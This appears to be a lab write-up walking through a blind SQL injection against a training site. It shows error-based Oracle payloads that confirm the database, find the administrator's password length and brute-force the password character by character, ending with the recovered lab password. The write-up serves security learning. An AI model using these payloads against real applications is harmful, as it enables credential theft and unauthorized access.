# Lab: Blind SQL injection with conditional errors #

# Lab Description #

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/7ef70fef-b9ab-4265-ac0e-a83f5c8b14f1)

> We have intercepted the request

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/8aa85057-4dc4-4d2e-998e-37c99bee42bb)

> We can manipulate the request

We can see check using `'||(SELECT '' FROM dual)||'` check whether it's using orcale or not

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/7d4aa820-0e75-4e5e-93d3-3fb0f08d9a8a)

> We can use `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'` check whether

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/1615a6d5-bec8-4872-b165-8454fc0ca0e8)

> We can see there is single row

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/32c7f027-e624-4653-94ef-725b3f598135)

> We can it giving error there username administrator is present

> We can use this payload check whether `'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
  whether password length is greater than 1

 ![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/4fc037ad-4977-488a-901c-441e8df1901f)

> We can see that password length is 20

> We can use this payload to check `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
  we can get first letter of the password.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/be866901-a121-43aa-a111-bb1a96b57130)

> We got first letter of the password by bruteforce `h`

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/da34e030-2742-4a31-907b-c5a46d6e0754)

> So we can now bruteforce get the password

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/443c61d4-7c52-485e-a5cc-d9f218ec547c)

>  We got password `hjnkvchejaml9or5g16e`

  ![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/ddf48bca-1c83-4b93-af66-f85d73198697)
